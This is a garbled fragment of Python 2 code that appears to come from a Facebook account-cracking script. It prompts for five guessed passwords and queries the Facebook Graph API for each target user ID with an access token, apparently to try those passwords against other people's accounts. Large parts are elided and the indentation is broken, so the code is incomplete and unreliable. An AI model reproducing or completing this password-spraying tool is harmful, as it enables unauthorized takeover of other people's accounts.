...
def pilih_super():
	...
	if peak =="":
		...
		try:
			...
			super()
    p1 = raw_input('\x1b[1;97m Type Any Password No1: ')
            p2 = raw_input('\x1b[1;97m Type Any Password No2: ')
            p3 = raw_input('\x1b[1;97m Type Any Password No3: ')
            p4 = raw_input('\x1b[1;97m Type Any Password No4: ')
            p5 = raw_input('\x1b[1;97m Type Any Password No5: ')
	...
	def main(arg):
		...
		user=arg
		try:
			h=requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			j=json.loads(h.text)
			ps1= p1
